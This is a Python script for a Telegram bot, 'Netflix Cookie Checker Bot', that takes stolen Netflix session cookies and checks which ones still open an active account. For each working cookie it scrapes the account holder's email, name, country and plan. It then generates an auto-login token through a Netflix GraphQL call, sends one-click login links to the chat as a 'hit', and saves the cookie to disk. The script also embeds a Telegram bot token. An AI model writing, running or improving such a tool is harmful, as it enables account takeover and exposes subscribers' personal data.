import re
import json
import time
import os
import threading
import requests
import urllib3
import urllib.parse
from datetime import datetime
from colorama import init, Fore, Style
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

COUNTRY_FLAGS = {"US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪"}
COUNTRY_NAMES = {"US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France","ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan","KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico","NL":"Netherlands","SE":"Sweden"}

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def load_cookies(text):
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        try:
            data = json.loads(text)
            if isinstance(data, list):
                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
            return data
        except: pass
    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            if k.strip(): cookies[k.strip()] = v.strip()
    return cookies

def generate_nftoken(netflix_id_raw):
    if not netflix_id_raw: return None
    try:
        sess = requests.Session()
        sess.cookies.set("NetflixId", netflix_id_raw, domain=".netflix.com")
        payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
        r = sess.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, headers={"User-Agent": UA_ANDROID}, timeout=15)
        tok = r.json().get("data", {}).get("createAutoLoginToken")
        return str(tok) if tok else None
    except: return None

def check_account(cookies):
    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
        return None
    sess = requests.Session()
    sess.headers.update({"User-Agent": UA_WEB})
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
    try:
        r = sess.get("https://www.netflix.com/account", timeout=20, allow_redirects=True)
        if "login" in r.url.lower(): return None
        html = r.text
        if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None

        email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
        name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or "User"
        cc = _rx(r'"countryOfSignup":"([A-Z]{2})"', html, "XX")
        plan = _djs(_rx(r'"localizedPlanName":\{"[^"]+":"([^"]+)"\}', html)) or "Premium"
        since = _djs(_rx(r'"memberSince":"([^"]+)"', html)) or "N/A"

        netflix_id = cookies.get("NetflixId", "")
        tok = generate_nftoken(netflix_id)
        base = f"https://netflix.com/?nftoken={urllib.parse.quote(tok)}" if tok else None

        return {
            "email": email or "N/A",
            "name": name,
            "country": COUNTRY_NAMES.get(cc, cc),
            "country_code": cc,
            "plan": plan,
            "member_since": since,
            "login_pc": base,
            "login_phone": base,
            "login_tv": "https://www.netflix.com/tv2",
            "netflix_id_raw": netflix_id
        }
    except:
        return None

class NetflixBot:
    def save_hit(self, acc, raw):
        os.makedirs("hits", exist_ok=True)
        safe = re.sub(r'[\\/:*?"<>|]', "_", acc["email"])
        with open(f"hits/{safe}.txt", "w", encoding="utf-8") as f:
            f.write(f"Netflix Hit - {acc['email']}\nPlan: {acc['plan']}\n\n{raw}")

    def send_hit(self, chat_id, acc):
        markup = types.InlineKeyboardMarkup(row_width=1)
        if acc.get("login_pc"):
            markup.add(types.InlineKeyboardButton("🖥 PC Login", url=acc["login_pc"]))
        if acc.get("login_phone"):
            markup.add(types.InlineKeyboardButton("📱 Phone Login", url=acc["login_phone"]))
        markup.add(types.InlineKeyboardButton("📺 TV Login", url=acc["login_tv"]))

        bot.send_message(chat_id,
            f"✅ <b>NETFLIX HIT</b>\n\n"
            f"👤 {acc['name']}\n"
            f"📧 <code>{acc['email']}</code>\n"
            f"🌍 {acc['country']} ({acc['country_code']})\n"
            f"📋 Plan: <b>{acc['plan']}</b>\n"
            f"📅 Since: {acc['member_since']}",
            parse_mode='HTML', reply_markup=markup)

nbot = NetflixBot()

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "🎬 <b>Netflix Cookie Checker Bot</b>\n\nPaste cookie text or send .txt file.", parse_mode='HTML')

@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        data = bot.download_file(file_info.file_path)
        cookie_text = data.decode('utf-8', errors='ignore')
        bot.send_message(message.chat.id, "🔍 Checking file...")
        threading.Thread(target=nbot.process_cookie, args=(message.chat.id, cookie_text), daemon=True).start()
    except:
        bot.send_message(message.chat.id, "❌ Failed to read file.")

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    text = message.text.strip()
    if len(text) > 50:  # Likely a cookie
        bot.send_message(message.chat.id, "🔍 Checking pasted cookie...")
        threading.Thread(target=nbot.process_cookie, args=(message.chat.id, text), daemon=True).start()

def process_cookie(self, chat_id, cookie_text):  # Added this method
    result = check_account(load_cookies(cookie_text))
    if result:
        nbot.save_hit(result, cookie_text)
        nbot.send_hit(chat_id, result)
    else:
        bot.send_message(chat_id, "❌ Invalid / Expired Cookie")

# Add the missing method to class
NetflixBot.process_cookie = process_cookie

if __name__ == "__main__":
    print(f"{Fore.GREEN}Netflix Cookie Checker Bot Started!{Style.RESET_ALL}")
    bot.infinity_polling()
